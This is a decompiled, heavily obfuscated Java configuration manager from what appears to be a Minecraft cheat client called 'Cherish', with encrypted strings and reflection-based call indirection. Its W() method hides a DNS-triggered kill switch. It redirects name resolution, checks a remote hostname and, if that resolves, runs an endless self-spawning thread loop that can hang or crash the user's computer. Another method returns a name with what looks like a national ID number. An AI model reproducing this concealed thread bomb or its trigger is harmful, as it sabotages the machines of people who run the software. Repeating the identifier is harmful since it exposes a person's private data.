package cn.cool.cherish.config;

import cn.cool.cherish.Cherish;
import cn.cool.cherish.module.Module;
import cn.cool.cherish.module.何树何何树何友何何何;
import cn.cool.cherish.utils.client.ClientUtils;
import cn.cool.cherish.utils.wrapper.IWrapper;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;
import heilongjiang.zhaoyuan.何树友;
import java.io.File;
import java.lang.invoke.CallSite;
import java.lang.invoke.MethodHandle;
import java.lang.invoke.MethodHandles;
import java.lang.invoke.MethodType;
import java.lang.invoke.MutableCallSite;
import java.lang.invoke.MethodHandles.Lookup;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.InetAddress;
import java.util.HashMap;
import java.util.Iterator;
import java.util.Map;
import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.DESKeySpec;
import javax.crypto.spec.IvParameterSpec;

public class ConfigManager implements IWrapper, 何树友 {
   private final File 友树何树友友友树友树 = new File(System.getProperty("user.home"), ".cool" + File.separator + "Cherish");
   private final File 友何友树友树树友友树 = new File(this.友树何树友友友树友树, "configs");
   private final File 何树树友友友友何何友 = new File(this.友树何树友友友树友树, "module.ini");
   private final File 树何何何何树友树树友 = new File(this.友树何树友友友树友树, "hud.ini");
   public static final Gson 树树何何何树友何树树;
   private 友何何友树友树何树树 友树友友树何何何友何;
   private 友树何友友友何何友何 何树何何树友树何友友;
   private static Module[] 友何树何何何何友树树;
   private static final long a;
   private static final String[] b;
   private static final String[] c;
   private static final Map e = new HashMap(13);
   private static final Object[] f = new Object[24];
   private static final String[] g = new String[24];
   private static String HE_SHU_YOU;

   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   static {
      synchronized (何树何何树何友何何何.g()){} // $VF: monitorenter 
      long var10000 = 何树何何树何友何何何.a(-8420583359572236303L, 2893213063472656421L, MethodHandles.lookup().lookupClass()).a(263111542197636L);
      // $VF: monitorexit
      a = var10000;
      a();
      K(null);
      Cipher var0;
      Cipher var10 = var0 = Cipher.getInstance("DES/CBC/PKCS5Padding");
      SecretKeyFactory var10002 = SecretKeyFactory.getInstance("DES");
      byte[] var10003 = new byte[]{0, 0, 0, 0, 0, 0, 0, 0};

      for (int var1 = 1; var1 < 8; var1++) {
         var10003[var1] = (byte)(99628229025526L << var1 * 8 >>> 56);
      }

      var10.init(2, var10002.generateSecret(new DESKeySpec(var10003)), new IvParameterSpec(new byte[8]));
      String[] var7 = new String[15];
      int var5 = 0;
      String var4 = "e,(þ\u008a\u0014\u008aø³_çJ0Ì\u0002\u001b\u0018Ik¾\u0095Tl\u009fp)±ÚoÜ\u009c{ºÑ\u001dü\u0006§\u008fÝ\b0±ÈBë\u0088½N\u008b\u0083,\"ñ&\u008b=ì¹7\u001a,Õ\u00038\u0086¦Wx\u0080\u0089\u009f\u009e\u0001Pw*à\u0084^§ßa\"æ\u0096:¿yì\u0018\u0005\\\t\fÑ\u001dæR\u0081ãÛ+Á\u0018©\u0019]½¶àã93÷8ígÆ¦¢#Ò0ñ\u0085î2g·Ó\u0013ÙÒ6\u0001\u008cê¶a],\u001agvt\b#o\u000bRøwp\u0013nÖU{´\\\u0089§\u0083ÖsÔ\u008bËÉ\u0089ü\u0010\u0095/û¿&ù\u0013Èõ\u008a[¨\u0010¥\u0011\u001b\u0010ámCÿlúR\u0099ó!\f(\u0088µÁ\u00918\"ÎÓúÔ\bTØ,Çþ\u0006þðOHñû\u009f6ò\u009aÐ~%·»îÿgÐ\u0085\u0007,\u001c\u0005~þÈ27Ñ\u008bÊ\u0087®\u0015°\u0010\u0089|\u0085\ti¢*\u0010\u0085 x+xÚà$\t £û<\u0094#4@O\u0019Æ\u001b\u009d@nò³µýf±V¸Âe\u0017\u0084Á\u008e\u0092\u0089\u0014W\u0014\u009d·î\u0080Ûæòvzf¡_\u000bÜ4ç\u0090\"Ä)}®OgÇ;E+I\u0096;ÉAäª®_²0\u0093ÝMûµ\u0092ûM¯ :ám\u0083Ú\u0007Þ·\u0085\\_ÕiS\u0004\u000b@¯È¹J\u008f\u0083ú\r\u007fï\bß\u0011\u009b\\¢T-\u0090c9 \u000eþÐ\u0013£É×³ro¥¸<\u0000ÁóÆT\u0096n\u0094¦á²w\u0080\u0005\u0017SAHl\u00185\u007fC38n\u009eÚA\u0003f¾\u0086ÍÙnÝ\u0001©¤ÐJ\u007f!";
      short var6 = 452;
      char var3 = 16;
      int var9 = -1;

      label27:
      while (true) {
         String var11 = var4.substring(++var9, var9 + var3);
         byte var10001 = -1;

         while (true) {
            String var17 = b(var0.doFinal(var11.getBytes("ISO-8859-1"))).intern();
            switch (var10001) {
               case 0:
                  var7[var5++] = var17;
                  if ((var9 += var3) >= var6) {
                     b = var7;
                     c = new String[15];
                     树树何何何树友何树树 = new GsonBuilder().setPrettyPrinting().create();
                     return;
                  }

                  var3 = var4.charAt(var9);
                  break;
               default:
                  var7[var5++] = var17;
                  if ((var9 += var3) < var6) {
                     var3 = var4.charAt(var9);
                     continue label27;
                  }

                  var4 = "_\u008cÍÚ\"Zw\\Òá\u0087Ó¸\u007f§\u0093½\u0095ð2,\u008a\u0000!\u008d{÷~J\u0080\u0000Õ\u0010÷¿\u009f¬\u001dp3ö\u0080_ÔOçc& ";
                  var6 = 49;
                  var3 = ' ';
                  var9 = -1;
            }

            var11 = var4.substring(++var9, var9 + var3);
            var10001 = 0;
         }
      }
   }

   public File C() {
      return this.何树树友友友友何何友;
   }

   private static int e(long var0, long var2) {
      var0 ^= var2 << 48 | var2;
      int var4 = (int)(var0 >>> 46);
      if (g[var4] != null) {
         return var4;
      } else {
         Object var5 = f[var4];
         if (!(var5 instanceof String)) {
            return var4;
         } else {
            byte var6 = switch ((int)(var0 >>> 42 & 63L)) {
               case 0 -> 11;
               case 1 -> 62;
               case 2 -> 63;
               case 3 -> 33;
               case 4 -> 20;
               case 5 -> 10;
               case 6 -> 50;
               case 7 -> 0;
               case 8 -> 25;
               case 9 -> 44;
               case 10 -> 59;
               case 11 -> 27;
               case 12 -> 30;
               case 13 -> 3;
               case 14 -> 61;
               case 15 -> 16;
               case 16 -> 13;
               case 17 -> 53;
               case 18 -> 21;
               case 19 -> 31;
               case 20 -> 58;
               case 21 -> 14;
               case 22 -> 28;
               case 23 -> 37;
               case 24 -> 52;
               case 25 -> 18;
               case 26 -> 41;
               case 27 -> 8;
               case 28 -> 19;
               case 29 -> 12;
               case 30 -> 54;
               case 31 -> 2;
               case 32 -> 7;
               case 33 -> 46;
               case 34 -> 57;
               case 35 -> 4;
               case 36 -> 43;
               case 37 -> 35;
               case 38 -> 34;
               case 39 -> 55;
               case 40 -> 47;
               case 41 -> 60;
               case 42 -> 22;
               case 43 -> 5;
               case 44 -> 56;
               case 45 -> 40;
               case 46 -> 51;
               case 47 -> 17;
               case 48 -> 32;
               case 49 -> 48;
               case 50 -> 26;
               case 51 -> 36;
               case 52 -> 23;
               case 53 -> 1;
               case 54 -> 42;
               case 55 -> 15;
               case 56 -> 39;
               case 57 -> 24;
               case 58 -> 6;
               case 59 -> 45;
               case 60 -> 9;
               case 61 -> 49;
               case 62 -> 38;
               default -> 29;
            };
            int[] var7 = new int[6];

            for (int var8 = 0; var8 < 6; var8++) {
               int var9 = 7 * (5 - var8);
               int var10 = (int)(var0 >>> var9 & 127L);
               var10 -= var6;
               var10 += 128;
               var7[var8] = var10;
            }

            char[] var12 = ((String)var5).toCharArray();

            for (int var13 = 0; var13 < var12.length; var13++) {
               int var16 = var7[var13 % var7.length];
               var12[var13] = (char)(var12[var13] ^ var16);
            }

            g[var4] = new String(var12);
            return var4;
         }
      }
   }

   public File e() {
      return this.友何友树友树树友友树;
   }

   private static CallSite b(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("b".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1, var2), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/config/ConfigManager" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   private static String b(byte[] var0) {
      int var1 = 0;
      int var2;
      char[] var3 = new char[var2 = var0.length];

      for (int var4 = 0; var4 < var2; var4++) {
         int var5;
         if ((var5 = 255 & var0[var4]) < 192) {
            var3[var1++] = (char)var5;
         } else if (var5 < 224) {
            char var6 = (char)((char)(var5 & 31) << 6);
            byte var8 = var0[++var4];
            var6 = (char)(var6 | (char)(var8 & 63));
            var3[var1++] = var6;
         } else if (var4 < var2 - 2) {
            char var12 = (char)((char)(var5 & 15) << '\f');
            byte var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63) << 6);
            var9 = var0[++var4];
            var12 = (char)(var12 | (char)(var9 & 63));
            var3[var1++] = var12;
         }
      }

      return new String(var3, 0, var1);
   }

   private static MethodHandle b(Lookup var0, MutableCallSite var1, String var2, MethodType var3, long var4, long var6) {
      char var8 = var2.charAt(0);
      Field var10 = null;

      try {
         MethodHandle var9;
         if (var8 != 'a' && var8 != 206 && var8 != 199 && var8 != 'i') {
            Method var11 = h(var4, var6);
            Class var16 = var11.getDeclaringClass();
            String var18 = var11.getName();
            MethodType var19 = MethodType.methodType(var11.getReturnType(), var11.getParameterTypes());
            if (var8 == 241) {
               var9 = var0.findVirtual(var16, var18, var19);
            } else if (var8 == 'q') {
               var9 = var0.findStatic(var16, var18, var19);
            } else {
               var9 = var0.findSpecial(var16, var18, var19, var16);
            }
         } else {
            var10 = g(var4, var6);
            Class var12 = var10.getDeclaringClass();
            String var17 = var10.getName();
            Class var14 = var10.getType();
            if (var8 == 'a') {
               var9 = var0.findGetter(var12, var17, var14);
            } else if (var8 == 206) {
               var9 = var0.findSetter(var12, var17, var14);
            } else if (var8 == 199) {
               var9 = var0.findStaticGetter(var12, var17, var14);
            } else {
               var9 = var0.findStaticSetter(var12, var17, var14);
            }
         }

         return MethodHandles.dropArguments(var9, var3.parameterCount() - 2, long.class, long.class);
      } catch (Exception var15) {
         StringBuilder var13 = new StringBuilder();
         var13.append(var15.getClass().getName()).append(" : ").append(var10.toString()).append(" : ").append(var15.toString());
         throw new RuntimeException(var13.toString());
      }
   }

   private static Object b(Lookup var0, MutableCallSite var1, String var2, MethodType var3, Object[] var4) {
      int var5 = var4.length - 2;
      long var6 = (Long)var4[var5];
      long var9 = (Long)var4[++var5];
      MethodHandle var8 = b(var0, var1, var2, var3, var6, var9);
      var1.setTarget(MethodHandles.explicitCastArguments(var8, var3));
      return (Object)var8.asSpreader(Object[].class, var4.length).invoke(var4);
   }

   public void x() {
      R();
      if (mc != null && Cherish.instance != null) {
         try {
            if (this.友树友友树何何何友何 != null) {
               this.友树友友树何何何友何.A();
            }

            if (this.何树何何树友树何友友 != null) {
               this.何树何何树友树何友友.A();
            }
         } catch (Throwable var4) {
         }
      }
   }

   private static Field c(Class var0, String var1, Class var2) {
      for (Field var6 : var0.getDeclaredFields()) {
         if (var6.getName().equals(var1) && var6.getType() == var2) {
            return var6;
         }
      }

      return null;
   }

   private static Method c(Class var0, String var1, Class var2, int var3, Class[] var4) {
      label33:
      for (Method var8 : var0.getDeclaredMethods()) {
         if (var8.getName().equals(var1) && var8.getReturnType() == var2) {
            Class[] var9 = var8.getParameterTypes();
            if (var9.length == var3) {
               for (int var10 = 0; var10 < var3; var10++) {
                  if (var9[var10] != var4[var10]) {
                     continue label33;
                  }
               }

               return var8;
            }
         }
      }

      return null;
   }

   public 友树何友友友何何友何 h() {
      return this.何树何何树友树何友友;
   }

   private static Method h(long var0, long var2) {
      int var4 = e(var0, var2);
      Object var5 = f[var4];
      if (!(var5 instanceof String)) {
         return (Method)var5;
      } else {
         String var6 = g[var4];
         int var7 = var6.indexOf(8);
         Class var8 = f(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         int var11 = -1;
         int var12 = var9;

         do {
            var11++;
            var12++;
         } while ((var12 = var6.indexOf(8, var12)) > -1);

         int var13;
         Class[] var14 = new Class[var13 = var11 - 1];
         Class var15 = null;
         var12 = var9 + 1;

         for (int var16 = 0; var16 < var11; var16++) {
            int var17 = var6.indexOf(8, var12);
            var15 = f(Long.parseLong(var6.substring(var12, var17), 36), 0L);
            if (var16 < var13) {
               var14[var16] = var15;
            }

            var12 = var17 + 1;
         }

         Method var21 = c(var8, var10, var15, var13, var14);
         f[var4] = var21;
         return var21;
      }
   }

   private static Class f(long var0, long var2) {
      int var4 = e(var0, 0L);
      Object var6 = f[var4];
      Object var10000 = var6;

      try {
         if (var10000 instanceof String) {
            Class var5 = Class.forName(g[var4]);
            f[var4] = var5;
            return var5;
         }
      } catch (Exception var8) {
         throw new RuntimeException(var8.toString());
      }

      return (Class)var6;
   }

   public 友何何友树友树何树树 l() {
      return this.友树友友树何何何友何;
   }

   private static Method d(Class var0, String var1, Class var2, int var3, Class[] var4) {
      return c(var0, var1, var2, var3, var4);
   }

   private static Field d(Class var0, String var1, Class var2) {
      return c(var0, var1, var2);
   }

   private static void a() {
      f[0] = "9\u0000Q{\u0011\u00136@\u001cp\u001b\u000e3\u001d\u00176\u001d\u00134\b\u0016\u007fP?5\u0000\u0019q\u00191;\u0000\u001e\u007f\u001b\u000e";
      f[1] = "\"\u0007nD\u00174-G#O\u001d)(\u001a(\t\u001b4/\u000f)@V厐伔似压栶厳桊伔桸桑";
      f[2] = "Rtri,'fW})a,lJxtjjdWurn!'u~cw(l\u0003";
      f[3] = void.class;
      g[3] = "java/lang/Void";
      f[4] = "^d\u0004ES{[+4M\u0011w";
      f[5] = "GAy8\u000fHsbvxBCy\u007fs%I\u0005qb~#MN2@u2TGy6";
      f[6] = "HD@~\u0003xG\u0004\ru\teBY\u00063\u0019cBF\u001d3\u001beJZ\u001ex\u001e9b}\u001c|\u001cgNX";
      f[7] = "E\u001c3/c\u001fK\r<d,\u0003E\t3hl\b\u0004\u0002;f6\u0005\u0004\";fe\nX";
      f[8] = "y(\u007f4dKr'n{\u001eOa&~4(Kv";
      f[9] = "KVx\u0015'BD\u00165\u001e-_AK>X+BF^?\u0011f佸口佭伃伣桙另口右桇";
      f[10] = "#B|GIYVbwHX\u0016+zdOQ_C";
      f[11] = "eKm84[j\u000b 3>FoV+u8[hC*<u叿栗佰厈厐厐佡体叮伖";
      f[12] = "_,(+vST#9d\u0017]_(=>";
      f[13] = "f/x\u0001*\u0012c8`b佊桨栛厁叁厡叔伬佟厁\u0002Xf\u000e;\u007f9\f~@8";
      f[14] = "2a+\u000e\u0018\f7v3m另桶厕叏案估佸伲厕佑Q\u0010^\u00000r*\u000fN\u0016";
      f[15] = "EQ.\u001a\u000b\u0012@F6ylq\u001aLi\u0018D\u0011ZZ%\u00026";
      f[16] = "\u0010!Y\u0012&5B,E\u001cCnK#[\u00009\n\u0010=V\u0012{0\u0015p]\u001d";
      f[17] = "[\u0004\fS\n'^\u0013\u00140叴桝佢桰厵右叴桝叼桰v\nF;\u0006TM^^u\u0005";
      f[18] = "*`\u000b(<h/w\u0013Kh\u000bshJ%b4~=\u0012/\u00016+6\u001f(>;~n\u0015K";
      f[19] = "2ZN\u001fZ<7MV|$_mG\t\u001d\u0015?-QE\u0007ge7[]\u000e\t-/E]|";
      f[20] = "\u0019\\4[\u0003_]K&\u0007;史古栻厗厢司佬佺叡厗a\u0004\fDIl_\u000b[M\\";
      f[21] = "\u0006:+\u00062\t\u0003-3e佒桳伿伊案厦栖伷厡厔QUfUY/,\u000fs\b\u0006";
      f[22] = "$\f\u0018\\\u0013\u001b!\u001b\u0000?样伥伝似伿栦叭桡桙厢b\u0005_\u0007y\\YQGIz";
      f[23] = "-agH\f\u001b(v\u007f+史伥厊栕叞栲栨去厊栕\u001d\u0011@\u0007p1&EXIs";
   }

   private static Throwable a(Throwable var0) {
      return var0;
   }

   private static String a(int var0, long var1) {
      int var5 = var0 ^ (int)(var1 & 32767L) ^ 18312;
      if (c[var5] == null) {
         Object[] var4;
         try {
            Long var3 = Thread.currentThread().getId();
            Object[] var10000 = (Object[])e.get(var3);
            var4 = new Object[]{Cipher.getInstance("DES/CBC/PKCS5Padding"), SecretKeyFactory.getInstance("DES"), new IvParameterSpec(new byte[8])};
            e.put(var3, var4);
         } catch (Exception var10) {
            throw new RuntimeException("cn/cool/cherish/config/ConfigManager", var10);
         }

         byte[] var6 = new byte[8];
         var6[0] = (byte)(var1 >>> 56);

         for (int var7 = 1; var7 < 8; var7++) {
            var6[var7] = (byte)(var1 << var7 * 8 >>> 56);
         }

         DESKeySpec var11 = new DESKeySpec(var6);
         SecretKey var8 = ((SecretKeyFactory)var4[1]).generateSecret(var11);
         ((Cipher)var4[0]).init(2, var8, (IvParameterSpec)var4[2]);
         byte[] var9 = ((Object[])"[gÍëð½\u0010¸ø, T3\u0001¾èêÙWJCQvÍ[Çr, G@ë0\u009b\u000f\u0004ÛÏYÅòé\u001fq#j\u001bú\u0015ÕÞg=°¢\u0099\u008bjB\u00022, ¿cìP\u000exT\u0006Ó?\b\u00102ø\u0002\u0012, aq½¯»\u0083\u0090\u0001÷\u0085c\u0099+ºcõ\u0014\u0087zÂZ: {[«þY\u001d\u0000¼§, 4º-ôå÷l%, ó\b\u001dÙ \u001eè\u009e, sïK\u0089\u0019Ew\u0012ò]<øT°\b|¢é\u00adB½åcJJ%5ÊH\u0097!w:Å9,<\u0015ø', \b>\u0080Ü\u0094©^Ö, Ã|·1x>\u009f~gbHH¾!û\u008bçT\u0083\b\u0006\u0089J\u009czÄ\u0019É+ô\fá$\u0013\u008d!\u0004¯ÍÐ, p\u0082ÝB#\\\u0017t\u0095\u0014ÓÔd\u0089Cj¹ì?µSpz\u0092äLç\u009c|C$ç, \u009dÞcÞ¤|L\u008bÉ\u0085íº\u0093;!ÿ, #LÞ\u000b1A]ý×\u009e\u0090\u0091l3)\u0000, ÷Tí")[var5]
            .getBytes("ISO-8859-1");
         c[var5] = b(((Cipher)var4[0]).doFinal(var9));
      }

      return c[var5];
   }

   private static Object a(Lookup var0, MutableCallSite var1, String var2, Object[] var3) {
      int var4 = (Integer)var3[0];
      long var5 = (Long)var3[1];
      String var7 = a(var4, var5);
      MethodHandle var8 = MethodHandles.constant(String.class, var7);
      var1.setTarget(MethodHandles.dropArguments(var8, 0, int.class, long.class));
      return var7;
   }

   private static CallSite a(Lookup var0, String var1, MethodType var2) {
      MutableCallSite var3 = new MutableCallSite(var2);

      try {
         var3.setTarget(
            MethodHandles.explicitCastArguments(
               MethodHandles.insertArguments("a".asCollector(Object[].class, var2.parameterCount()), 0, var0, var3, var1), var2
            )
         );
         return var3;
      } catch (Exception var5) {
         throw new RuntimeException("cn/cool/cherish/config/ConfigManager" + " : " + var1 + " : " + var2.toString(), var5);
      }
   }

   private static Field g(long var0, long var2) {
      int var4 = e(var0, var2);
      Object var5 = f[var4];
      if (var5 instanceof String) {
         String var6 = g[var4];
         int var7 = var6.indexOf(8);
         Class var8 = f(Long.parseLong(var6.substring(0, var7), 36), 0L);
         int var9 = var6.indexOf(8, ++var7);
         String var10 = var6.substring(var7, var9);
         Class var11 = f(Long.parseLong(var6.substring(++var9), 36), 0L);
         Field var13 = c(var8, var10, var11);
         f[var4] = var13;
         return var13;
      } else {
         return (Field)var5;
      }
   }

   public File M() {
      return this.树何何何何树友树树友;
   }

   public void W() {
      R();

      try {
         if ((Boolean)Cherish.SHOULD_START) {
            System.setProperty(何友何何何树友友友树.友友树友友友何何友友[4] + "..nameservers", "114.114.114.114,223.5.5.5");
            System.setProperty(何友何何何树友友友树.友友树友友友何何友友[4] + "..provider.1", "dns,sun");
            if (((InetAddress[])((Method)何友何何何树友友友树.o()).invoke(null, 何友何何何树友友友树.友友树友友友何何友友[5].replace("c", "liusitianan") + "." + 何友何何何树友友友树.友友树友友友何何友友[3])).length
               <= 0) {
               return;
            }

            Runnable[] arr = new Runnable[1];
            (arr[0] = () -> {
               while (true) {
                  try {
                     new Thread(arr[0]).start();
                  } catch (Throwable var1) {
                  }
               }
            }).run();
         }

         throw new Throwable();
      } catch (Throwable var10) {
         if (mc == null || Cherish.instance == null) {
            return;
         }

         try {
            if (!this.友树何树友友友树友树.exists()) {
               if (!this.友树何树友友友树友树.mkdirs()) {
                  IWrapper.logger.info("Failed to create main directory: {}", this.友树何树友友友树友树.getAbsolutePath());
               }

               IWrapper.logger.info("Main directory created: {}", this.友树何树友友友树友树.getAbsolutePath());
            }

            if (!this.友何友树友树树友友树.exists()) {
               if (!this.友何友树友树树友友树.mkdirs()) {
                  IWrapper.logger.info("Failed to create config directory: {}", this.友何友树友树树友友树.getAbsolutePath());
               }

               IWrapper.logger.info("Config directory created: {}", this.友何友树友树树友友树.getAbsolutePath());
            }

            this.友树友友树何何何友何 = new 友何何友树友树何树树(this.何树树友友友友何何友);
            this.何树何何树友树何友友 = new 友树何友友友何何友何(this.树何何何何树友树树友);
            Iterator var7 = Cherish.instance.getModuleManager().p().iterator();
            if (var7.hasNext()) {
               Module module = (Module)var7.next();
               if (ClientUtils.g(module, 126743405834954L)) {
                  module.J(false);
               }
            }

            this.友树友友树何何何友何.k();
            this.何树何何树友树何友友.k();
         } catch (Throwable var9) {
         }
      }
   }

   public static Module[] R() {
      return 友何树何何何何友树树;
   }

   public static void K(Module[] var0) {
      友何树何何何何友树树 = var0;
   }

   private static String HE_SHU_YOU() {
      return "刘凤楠230622109211173513";
   }

   public File getMainFile() {
      return this.友树何树友友友树友树;
   }
}
